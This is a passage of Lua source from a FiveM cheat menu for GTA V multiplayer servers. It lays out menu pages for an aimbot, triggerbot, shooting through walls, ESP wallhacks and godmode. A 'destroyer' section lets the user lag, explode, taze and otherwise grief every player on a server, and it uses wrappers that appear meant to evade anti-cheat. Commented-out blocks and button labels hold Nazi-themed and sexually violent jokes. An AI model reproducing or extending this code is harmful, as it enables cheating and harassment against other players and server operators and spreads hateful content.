                               if Fatasf.n.IsEntityDead(Fatasf.n.GetPlayerPed(CockT.Global.SelectedPlayer)) then
                                   if tf.Button('Status: ~r~Dead') then 
                                   end
                               else
                                   if tf.Button('Status: ~g~Alive') then 
                                   end
                               end
                               --if tf.Button('Status: '.. (Fatasf.n.IsPedDeadOrDying(Fatasf.n.GetPlayerPed(i), 1) and "~r~Dead " or "~g~Alive ")) then end
                               if tf.Button('Godmode: '..CockT.Strings.tostring(CockMeni.Functions.IsPlayerInFvckinDooogInvincibleglifeshit(CockT.Global.SelectedPlayer))) then end
                               --if tf.Button('Health: ~g~'..Fatasf.n.GetEntityHealth(Fatasf.n.GetPlayerPed(i))) then end
                               if tf.Button('Armour: ~b~'..Fatasf.n.GetPedArmour(Fatasf.n.GetPlayerPed(CockT.Global.SelectedPlayer))) then end
       
                           end
       
                           if tf.IsMenuOpened("online") then 
                               --[[local players = Fatasf.n.GetActivePlayers()
                               for i = 1, #players do
                                   local player = players[i]
                                   if CockMeni.Functions.MenuButton("ID: "..Fatasf.n.GetPlayerServerId(players[i]).." | "..Fatasf.n.GetPlayerName(players[i]), "OnlineMenuButtons", ">") then 
                                       CockT.Global.SelectedPlayer = player
                                   end
                               end]]
                               
                               local ids = Fatasf.n.GetActivePlayers()
                               if CockT.Global.SelectedPlayer == nil then
                                   CockT.Global.SelectedPlayer = ids[1]
                               end
                               for i = 1, #ids do
                                   local player = ids[i]
                                   if CockMeni.Functions.MenuButton("ID: "..Fatasf.n.GetPlayerServerId(player).." | "..Fatasf.n.GetPlayerName(player), "OnlineMenuButtons", ">") then 
                                       CockT.Global.SelectedPlayer = player
                                   end
                               end
   
                           end
       
                           if tf.IsMenuOpened("vehicle") then
                               if CockMeni.Functions.MenuButton("Addons", "addons", ">") then 
                               end
                               if CockMeni.Functions.MenuButton("LS Customs", "lscustoms", ">") then 
                               end
                               
       
                               if CockMeni.Functions.ComboBox("Custom veh speed", CockMenu.ComboBoxesT.vehspeed, CockMenu.ComboBoxesT.vehspeedMultIndex, CockMenu.ComboBoxesT.vehspeedLengMult, function(currentIndex, selIndex)
                                   CockMenu.ComboBoxesT.vehspeedMultIndex = currentIndex
                                   CockMenu.ComboBoxesT.vehspeedLengMult = currentIndex
                               end) then
                               end
       
                               if tf.CSeparator("~y~SPAWNING", "") then
                               end
                               if CockMeni.Functions.CheckBox("Spawn In Car", Cock.Menu.SpawnInCar) then
                                   Cock.Menu.SpawnInCar = not Cock.Menu.SpawnInCar
                               end
                               if tf.Button("Spawn Vehicle", "~g~Native") then
                                   local car =  Functions.f.CustomInput('Create Vehicle', '', 30)
                                   Functions.f.SpawnVehicle(car)
                               elseif tf.CSeparator("~y~VISUAL", "") then
                               elseif tf.Button("Repair", "~g~Native") then
                                   Functions.f.RepairVehicle()
                               elseif tf.Button("Max tuning", "~y~Semi") then
                                   CockT.Global.MaxTuning()
                               elseif tf.Button("Tuning with ramp", "~y~Semi") then
                                   CockT.Global.TuningRamp()
                               elseif tf.Button("Performance tuning", "~y~Semi") then
                                   CockT.Global.PerformanceTuning(Fatasf.n.GetVehiclePedIsIn(Fatasf.n.PlayerPedId(), false))
                               elseif tf.Button("Flip vehicle", "~g~Native") then
                                   CockMeni.Functions.FlipVehicle()
                               elseif tf.Button("Delete vehicle", "~g~Native") then
                                   Fatasf.n.DeleteEntity(Fatasf.n.GetVehiclePedIsIn(Fatasf.n.PlayerPedId()))
                               elseif tf.Button("Unlock closest vehicle", "~g~Safe") then
                                   local vehicle = CockT.Inv["Invoke"](CockT.Natives['GetClosestVehicle'], Fatasf.n.GetEntityCoords(Fatasf.n.PlayerPedId()), 25.0, 0, 70)
                                   Functions.f.UnlockVehicle(vehicle)
                               elseif tf.Button("Lock closest vehicle", "~g~Safe") then
                                   local vehicle = CockT.Inv["Invoke"](CockT.Natives['GetClosestVehicle'], Fatasf.n.GetEntityCoords(Fatasf.n.PlayerPedId()), 25.0, 0, 70)
                                   Functions.f.LockVehicle(vehicle)
                               elseif tf.Button("Custom colour", "~r~Risky") then
                                   Cock.Menu.cvcolour = not Cock.Menu.cvcolour
                               elseif tf.CSeparator("~y~OTHER", "") then
                               elseif tf.Button("Change plate", "~g~Native") then
                                   local result = Functions.f.CustomInput('Enter Vehicle Plate', 'CockMenu', 8)
                                   local car = Fatasf.n.GetVehiclePedIsUsing(Fatasf.n.PlayerPedId())
                                   Fatasf.n.SetVehicleNumberPlateText(car, result) 
                               elseif tf.Button("Clean vehicle", "~g~Native") then
                                   CockT.Global.CleanVehicle()
                               elseif tf.Button("Random vehicle colour", "~g~Native") then
                                   CockT.Global.RandomColour()
                               elseif CockMeni.Functions.CheckBox("Cock Plate", Cock.Menu.cockplate) then
                                   Cock.Menu.cockplate = not Cock.Menu.cockplate
       
                               elseif CockMeni.Functions.CheckBox("Drive To Waypoint", Cock.Menu.DriveToWaypoint) then
                                   Cock.Menu.DriveToWaypoint = not Cock.Menu.DriveToWaypoint
                               elseif CockMeni.Functions.CheckBox("NoFall", Cock.Menu.nofall) then
                                   Cock.Menu.nofall = not Cock.Menu.nofall
                               end
       
                           
       
                       end
       
                           if tf.IsMenuOpened("WeaponsCustoms") then
                               if CockMeni.Functions.CheckBox("Suppressor", Cock.Menu.Suppressor) then
                                   Cock.Menu.Suppressor = not Cock.Menu.Suppressor
                                   if Cock.Menu.Suppressor then
                                       CockT.Global.GiveWeaponComponentToPed(0x65EA7EBB)
                                       CockT.Global.GiveWeaponComponentToPed(0x837445AA)
                                       CockT.Global.GiveWeaponComponentToPed(0xA73D4664)
                                       CockT.Global.GiveWeaponComponentToPed(0xC304849A)
                                       CockT.Global.GiveWeaponComponentToPed(0xE608B35E)
                                   else
                                       CockT.Global.RemoveWeaponComponentFromPed(0x65EA7EBB)
                                       CockT.Global.RemoveWeaponComponentFromPed(0x837445AA)
                                       CockT.Global.RemoveWeaponComponentFromPed(0xA73D4664)
                                       CockT.Global.RemoveWeaponComponentFromPed(0xC304849A)
                                       CockT.Global.RemoveWeaponComponentFromPed(0xE608B35E)
                                   end
                               end
                               if CockMeni.Functions.CheckBox("Flashlight", Cock.Menu.Flashlight) then
                                   Cock.Menu.Flashlight = not Cock.Menu.Flashlight
                                   if Cock.Menu.Flashlight then
                                       CockT.Global.GiveWeaponComponentToPed(0x359B7AAE)
                                       CockT.Global.GiveWeaponComponentToPed(0x7BC4CDDC)
                                   else
                                       CockT.Global.RemoveWeaponComponentFromPed(0x359B7AAE)
                                       CockT.Global.RemoveWeaponComponentFromPed(0x7BC4CDDC)
                                   end
                               end
                               if CockMeni.Functions.CheckBox("Extended Magazine", Cock.Menu.ExtendedMag) then
                                   Cock.Menu.ExtendedMag = not Cock.Menu.ExtendedMag
                                   if Cock.Menu.ExtendedMag then
                                       CockT.Global.GiveWeaponComponentToPed(0x249A17D5) CockT.Global.GiveWeaponComponentToPed(0x64F9C62B)
                                       CockT.Global.GiveWeaponComponentToPed(0x7B0033B3) CockT.Global.GiveWeaponComponentToPed(0x7C8BD10E) CockT.Global.GiveWeaponComponentToPed(0x86BD7F72) CockT.Global.GiveWeaponComponentToPed(0x8EC1C979)
                                       CockT.Global.GiveWeaponComponentToPed(0xB3688B0F) CockT.Global.GiveWeaponComponentToPed(0xD6C59CD6) CockT.Global.GiveWeaponComponentToPed(0xED265A1C) CockT.Global.GiveWeaponComponentToPed(0xD67B4F2D)
                                       CockT.Global.GiveWeaponComponentToPed(0xD9D3AC92) CockT.Global.GiveWeaponComponentToPed(0x33BA12E8) CockT.Global.GiveWeaponComponentToPed(0x10E6BA2B) CockT.Global.GiveWeaponComponentToPed(0x350966FB)
                                       CockT.Global.GiveWeaponComponentToPed(0xBB46E417) CockT.Global.GiveWeaponComponentToPed(0x334A5203) CockT.Global.GiveWeaponComponentToPed(0x82158B47) CockT.Global.GiveWeaponComponentToPed(0xEAC8C270)
                                       CockT.Global.GiveWeaponComponentToPed(0xB1214F9B) CockT.Global.GiveWeaponComponentToPed(0x91109691) CockT.Global.GiveWeaponComponentToPed(0xCCFD2AC5) CockT.Global.GiveWeaponComponentToPed(0x971CF6FD)
                                   else
                                       CockT.Global.RemoveWeaponComponentFromPed(0x249A17D5) CockT.Global.RemoveWeaponComponentFromPed(0x64F9C62B)
                                       CockT.Global.RemoveWeaponComponentFromPed(0x7B0033B3) CockT.Global.RemoveWeaponComponentFromPed(0x7C8BD10E) CockT.Global.RemoveWeaponComponentFromPed(0x86BD7F72) CockT.Global.RemoveWeaponComponentFromPed(0x8EC1C979)
                                       CockT.Global.RemoveWeaponComponentFromPed(0xB3688B0F) CockT.Global.RemoveWeaponComponentFromPed(0xD6C59CD6) CockT.Global.RemoveWeaponComponentFromPed(0xED265A1C) CockT.Global.RemoveWeaponComponentFromPed(0xD67B4F2D)
                                       CockT.Global.RemoveWeaponComponentFromPed(0xD9D3AC92) CockT.Global.RemoveWeaponComponentFromPed(0x33BA12E8) CockT.Global.RemoveWeaponComponentFromPed(0x10E6BA2B) CockT.Global.RemoveWeaponComponentFromPed(0x350966FB)
                                       CockT.Global.RemoveWeaponComponentFromPed(0xBB46E417) CockT.Global.RemoveWeaponComponentFromPed(0x334A5203) CockT.Global.RemoveWeaponComponentFromPed(0x82158B47) CockT.Global.RemoveWeaponComponentFromPed(0xEAC8C270)
                                       CockT.Global.RemoveWeaponComponentFromPed(0xB1214F9B) CockT.Global.RemoveWeaponComponentFromPed(0x91109691) CockT.Global.RemoveWeaponComponentFromPed(0xCCFD2AC5) CockT.Global.RemoveWeaponComponentFromPed(0x971CF6FD)
                                   end
                               end
                               if CockMeni.Functions.CheckBox("Grip", Cock.Menu.Grip) then
                                   Cock.Menu.Grip = not Cock.Menu.Grip
                                   if Cock.Menu.Grip then
                                       CockT.Global.GiveWeaponComponentToPed(0xC164F53)
                                   else
                                       CockT.Global.RemoveWeaponComponentFromPed(0xC164F53)
                                   end
                               end
                               if CockMeni.Functions.CheckBox("Scope", Cock.Menu.Scope) then
                                   Cock.Menu.Scope = not Cock.Menu.Scope
                                   if Cock.Menu.Scope then
                                       CockT.Global.GiveWeaponComponentToPed(0x9D2FBF29)
                                       CockT.Global.GiveWeaponComponentToPed(0xA0D89C42)
                                       CockT.Global.GiveWeaponComponentToPed(0xAA2C45B4)
                                       CockT.Global.GiveWeaponComponentToPed(0xD2443DDC)
                                       CockT.Global.GiveWeaponComponentToPed(0x3CC6BA57)
                                       CockT.Global.GiveWeaponComponentToPed(0x3C00AFED)
                                   else
                                       CockT.Global.RemoveWeaponComponentFromPed(0x9D2FBF29)
                                       CockT.Global.RemoveWeaponComponentFromPed(0xA0D89C42)
                                       CockT.Global.RemoveWeaponComponentFromPed(0xAA2C45B4)
                                       CockT.Global.RemoveWeaponComponentFromPed(0xD2443DDC)
                                       CockT.Global.RemoveWeaponComponentFromPed(0x3CC6BA57)
                                       CockT.Global.RemoveWeaponComponentFromPed(0x3C00AFED)
                                   end
                               end
                           end
   
                           if tf.IsMenuOpened("weapons") then 
                               if CockMeni.Functions.MenuButton("Aim", "WeaponsAimbot", "") then 
                               end
                               if CockMeni.Functions.MenuButton("Customizations", "WeaponsCustoms", "") then 
                               end
                               if tf.CSeparator("~y~WEAPONRY", "") then
                               end
       
                               if CockMeni.Functions.CheckBox("Teleport gun", Cock.Menu.Tpgun) then
                                   Cock.Menu.Tpgun = not Cock.Menu.Tpgun
                               end
                               if CockMeni.Functions.CheckBox("RPG gun", Cock.Menu.RPGGun) then
                                   Cock.Menu.RPGGun = not Cock.Menu.RPGGun
                               end
       
                               if CockMeni.Functions.CheckBox("Molotov gun", Cock.Menu.molotovgun) then
                                   Cock.Menu.molotovgun = not Cock.Menu.molotovgun
                               end
                               if CockMeni.Functions.CheckBox("Particles gun", Cock.Menu.particlegun) then
                                   Cock.Menu.particlegun = not Cock.Menu.particlegun
                               end
                               if CockMeni.Functions.CheckBox("Rapid fire", Cock.Menu.rapidfire) then
                                   Cock.Menu.rapidfire = not Cock.Menu.rapidfire
                               end
                               if CockMeni.Functions.CheckBox("Infinite ammo", Cock.Menu.infammo) then
                                   Cock.Menu.infammo = not Cock.Menu.infammo
                               end
                               if CockMeni.Functions.CheckBox("Shoot vehicles", Cock.Menu.shootvehs) then
                                   Cock.Menu.shootvehs = not Cock.Menu.shootvehs
                               end
                               if tf.CSeparator("~y~ALL WEAPONS", "") then
                               end
                               if tf.Button("Give all weapons", "~r~Risky") then 
                                   CockMeni.Functions.GiveAllWeapons()
                               end
                               if tf.Button("Remove all weapons", "~r~Risky") then 	
                                   CockMeni.Functions.RemoveAllWeapons()
                               end
       
                               if tf.CSeparator("~y~CUSTOM", "") then
                               end
                               if tf.Button("Spawn Weapon", "~g~Native") then 
                                   Functions.f.SpawnWeapon()
                               end
                               if tf.Button("Remove Weapon", "~g~Native") then 
                                   Functions.f.RemoveWeapon()
                               end
                               --[[if tf.CSeparator("~y~LAST GUN", "") then
                               end
                               if tf.Button("Spawn Last Weapon", "~g~Native") then 
                                   CockMeni.Functions.LastWeapon()
                               end
                               if tf.Button("Remove Last Weapon", "~g~Native") then 
                                   CockMeni.Functions.RemoveLastWeapon()
                               end]]
                               if tf.CSeparator("~y~AMMO", "") then
                               end
                               --[[if tf.Button("Set Ammo", "~g~Native") then 
                                   CockMeni.Functions.SetCurrentAmmo()
                               end	]]
                               if CockMeni.Functions.ComboBox("Set Ammo", CockMenu.ComboBoxesT.ammo, CockMenu.ComboBoxesT.ammoMultIndex, CockMenu.ComboBoxesT.ammoLengMult, function(currentIndex, selIndex)
                                   CockMenu.ComboBoxesT.ammoMultIndex = currentIndex
                                   CockMenu.ComboBoxesT.ammoLengMult = currentIndex
                               end) then
                                   Functions.f.SetCurrentAmmo(CockMenu.ComboBoxesT.ammo[CockMenu.ComboBoxesT.ammoMultIndex])
                               end
       
                               --[[if CockMeni.Functions.CheckBox("Equip On Give", CockMeni.Functions.EquipOnGive) then 
                                   CockMeni.Functions.EquipOnGive = not CockMeni.Functions.EquipOnGive				
                               end]]
                           end
       
                           if tf.IsMenuOpened("WeaponsAimbot") then 
                               if tf.CSeparator("~y~AIMBOT", "") then
                               end
       
                               if CockMeni.Functions.CheckBox("Enable aimbot (Hold left-alt)", CockMeni.Functions.Aimbot) then 
                                   CockMeni.Functions.Aimbot = not CockMeni.Functions.Aimbot				
                               end
   
                               if CockMeni.Functions.CheckBox("Enable Aimlock", CockMeni.Functions.Aimlock) then 
                                   CockMeni.Functions.Aimlock = not CockMeni.Functions.Aimlock
                               end
                               if CockMeni.Functions.CheckBox("Shoot through walls", CockMeni.Functions.udwallslock) then 
                                   CockMeni.Functions.udwallslock = not CockMeni.Functions.udwallslock				
                               end
                               if CockMeni.Functions.CheckBox("Enable ragebot", CockMeni.Functions.ragebot) then 
                                   CockMeni.Functions.ragebot = not CockMeni.Functions.ragebot
                               end
                               if CockMeni.Functions.CheckBox("Car Killer", CockMeni.Functions.Carkiller) then 
                                   CockMeni.Functions.Carkiller = not CockMeni.Functions.Carkiller				
                               end
                               if CockMeni.Functions.CheckBox("Triggerbot", CockMeni.Functions.Triggerbot) then 
                                   CockMeni.Functions.Triggerbot = not CockMeni.Functions.Triggerbot
                               end
                               if CockMeni.Functions.CheckBox("Hit sound (~r~BETA~s~)", CockMeni.Functions.hitsound) then 
                                   CockMeni.Functions.hitsound = not CockMeni.Functions.hitsound
                               end
                               if CockMeni.Functions.CheckBox("Hit marker", CockMeni.Functions.hitmarker) then 
                                   CockMeni.Functions.hitmarker = not CockMeni.Functions.hitmarker
                               end
       
                               if tf.CSeparator("~y~FOV", "") then
                               end
                               if CockMeni.Functions.CheckBox("Draw targets", CockMeni.Functions.targets) then 
                                   CockMeni.Functions.targets = not CockMeni.Functions.targets				
                               end
                               if CockMeni.Functions.CheckBox("Draw fov", CockMeni.Functions.fov) then 
                                   CockMeni.Functions.fov = not CockMeni.Functions.fov			
                               end
                               --[[if tf.CSeparator("~y~POINTS", "") then
                               end]]
                               if CockMeni.Functions.ComboBox("Distance", CockMenu.ComboBoxesT.Distance, CockMenu.ComboBoxesT.DistMultIndex, CockMenu.ComboBoxesT.DistLengMult, function(currentIndex, selIndex)
                                   CockMenu.ComboBoxesT.DistMultIndex = currentIndex
                                   CockMenu.ComboBoxesT.DistLengMult = currentIndex
                               end) then
                               end
                               if CockMeni.Functions.ComboBox("Fov", CockMenu.ComboBoxesT.Fov, CockMenu.ComboBoxesT.FovMultIndex, CockMenu.ComboBoxesT.FovLengMult, function(currentIndex, selIndex)
                                   CockMenu.ComboBoxesT.FovMultIndex = currentIndex
                                   CockMenu.ComboBoxesT.FovLengMult = currentIndex
                               end) then
                               end
                               if CockMeni.Functions.ComboBox("Bone", CockMenu.ComboBoxesT.Head, CockMenu.ComboBoxesT.HeadMultIndex, CockMenu.ComboBoxesT.HeadLengMult, function(currentIndex, selIndex)
                                   CockMenu.ComboBoxesT.HeadMultIndex = currentIndex
                                   CockMenu.ComboBoxesT.HeadLengMult = currentIndex
                               end) then
                               end
                               if CockMeni.Functions.CheckBox("Custom Damage", Cock.Menu.CustomDamage) then 
                                   Cock.Menu.CustomDamage = not Cock.Menu.CustomDamage			
                               end
                               if CockMeni.Functions.ComboBox("Damage modifier", CockMenu.ComboBoxesT.DmgModi, CockMenu.ComboBoxesT.DmgModiMultIndex, CockMenu.ComboBoxesT.DmgModiLengMult, function(currentIndex, selIndex)
                                   CockMenu.ComboBoxesT.DmgModiMultIndex = currentIndex
                                   CockMenu.ComboBoxesT.DmgModiLengMult = currentIndex 
                               end) then 
                               end
                           end
                           if tf.IsMenuOpened("visuals") then 
                               if tf.CSeparator("~y~ESP", "") then
                               end
                               if CockMeni.Functions.CheckBox("Include Self", Cock.Menu.includeself) then
                                   Cock.Menu.includeself = not Cock.Menu.includeself
                               end
                               if CockMeni.Functions.CheckBox("2D Boxes", Cock.Menu.boxes) then
                                   Cock.Menu.boxes = not Cock.Menu.boxes
                               end
                               if CockMeni.Functions.CheckBox("2D Boxes (#2)", Cock.Menu.boxesV2) then
                                   Cock.Menu.boxesV2 = not Cock.Menu.boxesV2
                               end
                               if CockMeni.Functions.CheckBox("2D Boxes (#3)", Cock.Menu.boxesV3) then
                                   Cock.Menu.boxesV3 = not Cock.Menu.boxesV3
                               end
                               if CockMeni.Functions.CheckBox("Corner Boxes", Cock.Menu.cornerbox) then
                                   Cock.Menu.cornerbox = not Cock.Menu.cornerbox
                               end
                               if CockMeni.Functions.CheckBox("Health bar", Cock.Menu.hpbar) then
                                   Cock.Menu.hpbar = not Cock.Menu.hpbar
                               end
                               if CockMeni.Functions.CheckBox("Armour bar", Cock.Menu.armourbar) then
                                   Cock.Menu.armourbar = not Cock.Menu.armourbar
                               end
                               if CockMeni.Functions.CheckBox("Glow ESP", Cock.Menu.espglow) then
                                   Cock.Menu.espglow = not Cock.Menu.espglow
                               end
                               if CockMeni.Functions.CheckBox("Player blips", Cock.Menu.blipsonmap) then
                                   Cock.Menu.blipsonmap = not Cock.Menu.blipsonmap
                               end
                               if CockMeni.Functions.CheckBox("Vehicle ESP", Cock.Menu.vehesp) then
                                   Cock.Menu.vehesp = not Cock.Menu.vehesp
                               end
                               if CockMeni.Functions.CheckBox("Tracers", Cock.Menu.tracers) then
                                   Cock.Menu.tracers = not Cock.Menu.tracers
                               end
                               if CockMeni.Functions.CheckBox("Info", Cock.Menu.infos) then
                                   Cock.Menu.infos = not Cock.Menu.infos
                               end
                               --[[if CockMeni.Functions.ComboBox("Info font", CockMenu.ComboBoxesT.InfoFont, CockMenu.ComboBoxesT.InfoFontMultIndex, CockMenu.ComboBoxesT.InfoFontLengMult, function(currentIndex, selIndex)
                                   CockMenu.ComboBoxesT.InfoFontMultIndex = currentIndex
                                   CockMenu.ComboBoxesT.InfoFontLengMult = currentIndex
                               end) then
                               end]]
                               if CockMeni.Functions.CheckBox("Display radar", Cock.Menu.displayradar) then
                                   Cock.Menu.displayradar = not Cock.Menu.displayradar
                               end
                               if CockMeni.Functions.CheckBox("Skeletons", Cock.Menu.skeletons) then
                                   Cock.Menu.skeletons = not Cock.Menu.skeletons
                               end
                               if CockMeni.Functions.ComboBox("ESP Distance", CockMenu.ComboBoxesT.EspDist, CockMenu.ComboBoxesT.EspDistMultIndex, CockMenu.ComboBoxesT.EspDistLengMult, function(currentIndex, selIndex)
                                   CockMenu.ComboBoxesT.EspDistMultIndex = currentIndex
                                   CockMenu.ComboBoxesT.EspDistLengMult = currentIndex
                               end) then
                               end
                               if tf.CSeparator("~y~CROSSHAIRS", "") then
                               end
                               if CockMeni.Functions.CheckBox("Crosshair", Cock.Menu.Crosshair) then
                                   Cock.Menu.Crosshair = not Cock.Menu.Crosshair
                               end
       
                               if tf.CSeparator("~y~OTHER", "") then
                               end
                               if tf.Button("Change hud colour", "~g~Native") then 
                                   Cock.Menu.customhud = not Cock.Menu.customhud
                               end	
                               if tf.Button("Change weather", "~g~Native") then 
                                   Fatasf.n.SetWeatherTypePersist("EXTRASUNNY")
                                   Fatasf.n.SetWeatherTypeNowPersist("EXTRASUNNY")
                                   Fatasf.n.SetWeatherTypeNow("EXTRASUNNY")
                                   Fatasf.n.SetOverrideWeather("EXTRASUNNY")
                               end	
                               
                               if CockMeni.Functions.CheckBox("Show coords", Cock.Menu.showcoords) then
                                   Cock.Menu.showcoords = not Cock.Menu.showcoords
                               end
                               if CockMeni.Functions.CheckBox("Road detector", Cock.Menu.roadetector) then
                                   Cock.Menu.roadetector = not Cock.Menu.roadetector
                               end
                               
                               if CockMeni.Functions.CheckBox("Force 3rd person", Cock.Menu.force3rdper) then
                                   Cock.Menu.force3rdper = not Cock.Menu.force3rdper
                               end
                               if CockMeni.Functions.CheckBox("Force driveby", Cock.Menu.forcedriveby) then
                                   Cock.Menu.forcedriveby = not Cock.Menu.forcedriveby
                               end
                               if CockMeni.Functions.CheckBox("Rainbow world", Cock.Menu.rainbowworld) then
                                   Cock.Menu.rainbowworld = not Cock.Menu.rainbowworld
                               end
                               if CockMeni.Functions.CheckBox("Be Torch", Cock.Menu.beliketorch) then 
                                   Cock.Menu.beliketorch = not Cock.Menu.beliketorch
                                   if Cock.Menu.beliketorch then
                                       Fatasf.n.SetExtraTimecycleModifier('mp_lad_day')
                                   else
                                       Fatasf.n.ClearExtraTimecycleModifier()
                                   end
                               end
                               if CockMeni.Functions.CheckBox("Tiny player", Cock.Menu.tinyplayer) then 
                                   Cock.Menu.tinyplayer = not Cock.Menu.tinyplayer
                               end
                               if CockMeni.Functions.CheckBox("Slowmotion", Cock.Menu.Slowmotion) then 
                                   Cock.Menu.Slowmotion = not Cock.Menu.Slowmotion
                               end
                               if CockMeni.Functions.CheckBox("Hide ID", Cock.Menu.hideid) then 
                                   Cock.Menu.hideid = not Cock.Menu.hideid  
                                   if Cock.Menu.hideid then
                                       CockT.Inv["Thread"](function()
                                           while Cock.Menu.hideid do
                                               CockT.Inv["Wait"](0)
                                               Fatasf.n.DrawRect(0.95, 0.1, 0.2, 0.2, 70, 70, 70, 255)
                                           end
                                       end)
                                   end
                               end
   
                               if CockMeni.Functions.ComboBox("Peds", CockMenu.ComboBoxesT.Peds, CockMenu.ComboBoxesT.PedsMultIndex, CockMenu.ComboBoxesT.PedsLengMult, function(currentIndex, selIndex)
                                   CockMenu.ComboBoxesT.PedsMultIndex = currentIndex
                                   CockMenu.ComboBoxesT.PedsLengMult = currentIndex
                               end) then
                                   local model = CockMenu.ComboBoxesT.PedsP[CockMenu.ComboBoxesT.PedsMultIndex]
                                   Fatasf.n.RequestModel(Fatasf.n.GetHashKey(model))
                                   CockT.Inv["Wait"](0)
                                   if Fatasf.n.HasModelLoaded(Fatasf.n.GetHashKey(model)) then
                                       CockT.Inv["Invoke"](CockT.Natives['SetPlayerModel'], Fatasf.n.PlayerId(), Fatasf.n.GetHashKey(model))
                                   end
                               end
   
                               --[[if tf.Button('Heil Hitla', '~g~Safe') then
                                   Cock.Menu.hailfvckinhitler = not Cock.Menu.hailfvckinhitler
                                   if Cock.Menu.hailfvckinhitler then
                                       --swastika soon :3
                                       hailhitlasorry = Fatasf.n.CreateAnDui("https://cock.menu/music/yes.mp3", 1, 1, 1)
                                       CockMeni.Functions.HailHitla()
                                       
                                   else
                                       Fatasf.n.DestroyDui(hailhitlasorry) 
                                       local ped = Fatasf.n.PlayerPedId() Fatasf.n.RequestTaskMoveNetworkStateTransition(ped, "Stop") if not Fatasf.n.IsPedInjured(ped) then Fatasf.n.ClearPedSecondaryTask(ped) end if not Fatasf.n.IsPedInAnyVehicle(ped, 1) then Fatasf.n.SetPedCurrentWeaponVisible(ped, 1, 1, 1, 1) end Fatasf.n.SetPedConfigFlag(ped, 36, 0) Fatasf.n.ClearPedSecondaryTask(Fatasf.n.PlayerPedId())
                                   end
                               end
                               if tf.Button('Moscow meme', '~g~Safe') then
                                   Cock.Menu.moscowmeme = not Cock.Menu.moscowmeme
                                   if Cock.Menu.moscowmeme then
                                       moscowwork = true
                                       CockMeni.Functions.LoadGifMoscow()
                                       CockT.Inv["Thread"](function()
                                           while moscowwork do
                                               CockT.Inv["Wait"](0)
                                               Fatasf.n.DrawSprite("cock_moscow", "vertissotraperdamnshit", 0.5, 0.5, 0.5, 0.5, 0.0, 255, 255, 255, 255)
                                           end
                                       end)
                                   else
                                       moscowwork = false
                                   end
                               end
                               
                               if tf.Button('USRR', '~g~Safe') then
                                   Cock.Menu.ussrmeme = not Cock.Menu.ussrmeme
                                   if Cock.Menu.ussrmeme then
   
                                       function loadAnimDict(dict)
                                           while (not Fatasf.n.HasAnimDictLoaded(dict)) do
                                               Fatasf.n.RequestAnimDict(dict)
                                               CockT.Inv["Wait"](5)
                                           end
                                       end
   
                                       hailhitlasorry = Fatasf.n.CreateAnDui("https://cock.menu/music/USSR.mp3", 1, 1, 1)
                                       local ad = "anim@mp_player_intuppersalute"
                                       local player = Fatasf.n.PlayerPedId()
                                       
                                       if ( Fatasf.n.DoesEntityExist( player ) and not Fatasf.n.IsEntityDead( player )) then 
                                           loadAnimDict( ad )
                                           if ( Fatasf.n.IsEntityPlayingAnim( player, ad, "idle_a", 3 ) ) then 
                                               Fatasf.n.TaskPlayAnim(player, ad, "exit", 8.0, 1.0, -1, 49, 0, 0, 0, 0 )
                                               CockT.Inv["Wait"](600)
                                               Fatasf.n.ClearPedSecondaryTask(Fatasf.n.PlayerPedId())
                                           else
                                               Fatasf.n.TaskPlayAnim(player, ad, "idle_a", 8.0, 1.0, -1, 49, 0, 0, 0, 0 )
                                               CockT.Inv["Wait"](500)
                                           end     
                                       end
                                   else
                                       Fatasf.n.DestroyDui(hailhitlasorry) 
                                       Fatasf.n.ClearPedSecondaryTask(Fatasf.n.PlayerPedId())
                                   end
                               end]]
   
                           end
                           if tf.IsMenuOpened("destroyer") then 
                               if tf.CSeparator("~y~FREECAM", "") then
                               end
                               if CockMeni.Functions.CheckBox("Freecam", Cock.Menu.Freecam) then
                                   Cock.Menu.Freecam = not Cock.Menu.Freecam
                               end
                               if tf.CSeparator("~y~TROLL", "") then
                               end
                               if tf.Button("Fly all vehicles", "~r~Risky") then 
                                   CockMeni.Functions.FlyAllVehs()
                                   
                               end
                               if tf.Button("Rape all players", "~r~Risky") then 
                                   for k, i in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                                       CockT.Global.RapeP(i)
                                   end 
                               end
                               if tf.Button("Lag all players", "~r~Risky") then 
                                   CockT.Global.LagAllPlayers()
                               end
                               if tf.Button("Delete all vehicles", "~r~Risky") then 
                                   for vehicle in Fatasf.n.EnumerateVehicles() do
                                       Fatasf.n.DeleteEntity(vehicle)
                                   end	
                               end
                               
                               if tf.Button("Explode everyone", "~r~Risky") then
                                   CockMeni.Functions.ExplodeAllPlayer()
                               end
                               if tf.Button("Taze everyone", "~r~Risky") then
                                   for k, i in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                                       CockT.Global.TazePlayer(i)
                                   end
                               end
                                   if tf.Button("Pounder everyone", "~r~Risky") then
                                       for k, i in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                                           CockMeni.Functions.PounderPlayers(i, 10)
                                       end
                                   end
       
                                   if tf.Button("Kill all peds", "~r~Risky") then
                                       CockMeni.Functions.killallpeds()
                                   end
                                   if tf.Button("Tug players", "~r~Risky") then
                                       CockMeni.Functions.TugAllPlayers()
                                   end
                                   if tf.Button("Enable all sirens", "~g~Safe") then
                                       CockMeni.Functions.EnableAllSirens()
                                   end
                                   if tf.Button("Enable all engines", "~g~Safe") then
                                       CockMeni.Functions.EnableAllEngines()
                                   end
                                   if tf.Button("Disable all engines", "~g~Safe") then
                                       Functions.f.DisableAllEngines()
                                   end
       
                                   if CockMeni.Functions.CheckBox("Disable all engines Loop", Cock.Menu.DisableAllEnginesLoop) then
                                       Cock.Menu.DisableAllEnginesLoop = not Cock.Menu.DisableAllEnginesLoop
                                   end
       
                                   if tf.Button('Custom prop', '~y~Semi') then
                                       local object = Functions.f.CustomInput("Custom prop name", "prop_beach_fire", 25)
                                       for k, i in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                                           CockT.Global.CustomProp(object, i)
                                       end
                                   end
                                   
                                   if tf.Button('Kick all from vehicle', '~y~Semi') then
                                      for k, i in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                                       CockT.Global.KickFromVehicle(i)
                                       end
                                   end
                                   if tf.Button('Fly all peds', '~y~Semi') then
                                       for Pped in Fatasf.n.EnumeratePeds() do
                                           Fatasf.n.NetworkRequestControlOfEntity(Pped)
                                           CockT.Inv["Invoke"](CockT.Natives['ApplyForceToEntity'], Pped, 3, 0.0, 0.0, 500.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
                                       end
                                   end
